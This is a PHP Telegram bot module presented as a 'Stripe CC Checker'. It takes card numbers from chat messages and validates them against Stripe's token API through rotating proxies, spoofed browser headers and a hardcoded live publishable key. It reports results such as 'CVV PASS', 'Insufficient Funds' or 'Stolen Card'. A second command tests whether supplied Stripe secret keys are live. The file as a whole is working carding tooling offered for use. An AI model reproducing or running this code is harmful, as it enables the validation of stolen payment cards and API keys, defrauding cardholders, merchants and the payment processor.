<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
        
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_PROXY, $url[array_rand($url)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpass[array_rand($userpass)]);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            
              
            $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: api.stripe.com',
        'method: POST',
        'path: /v1/tokens',
        'scheme: https',
        'accept: application/json',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://checkout.stripe.com',
        'referer: https://checkout.stripe.com/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'x-requested-with: XMLHttpRequest',
   ));

   curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F308cc4f)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F92.0.4515.159+Safari%2F537.36&device_id=f0b0d9b9-805b-4125-a7c7-5b414a04aa2c&referrer=https%3A%2F%2Fdonate-can.keela.co%2Fembed%2Ffoundations-for-social-change&time_checkout_opened=1629544338&time_checkout_loaded=1629544338&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&time_on_page=&guid=bab66549-00a4-453d-bb46-c1a5b4574ae605f1ee&muid=593746ec-57dd-4c47-af62-262eb860137da6aeff&sid=f3abed8b-e4d2-4b80-bfa3-8eb3e3829f270b151a&key=pk_live_moSrTlu0TpyA6fT2puny9SWr');

 $result1 = curl_exec($ch);
 $cvc_check = trim(strip_tags(getStr($result1,'"cvc_check":"','"')));
 $decline_check = trim(strip_tags(getStr($result1,'"decline_code":"','"')));
 $info = curl_getinfo($ch);
 $time = $info['total_time'];
 $httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 curl_close($ch);

// Responses

if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){

sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect ZIP Code </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charged 9$.%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Insufficient Funds. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect CVC. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CCN PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charge Rejected. </b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Pickup Card/Stolen Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif (strpos($result1, "do_not_honor")){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Do Not Honor. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card number is incorrect. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Incorrect (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Expired Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Expired (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card was declined.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, '"decline_code": "generic_decline"')){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Security Code Check : '.$cvc_check.' PROXY DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, 'null')){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A BRAND: <b>'.$brand.'</b> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A MESSAGE: <b>GATE ERROR (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "missing input"))){
sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
}

elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

// Bonus: SK Key Checker

elseif ((strpos($message, "/key") === 0)||(strpos($message, "!key") === 0)||(strpos($message, ".key") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);


if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Expired API key Provided.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Invalid API Key Provided.</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A MESSAGE: <b>You did not provide an API key.</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Testmode Charges Only.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}else{
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>SK Key Live.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>LIVE ✅</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}
}

// Function

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>
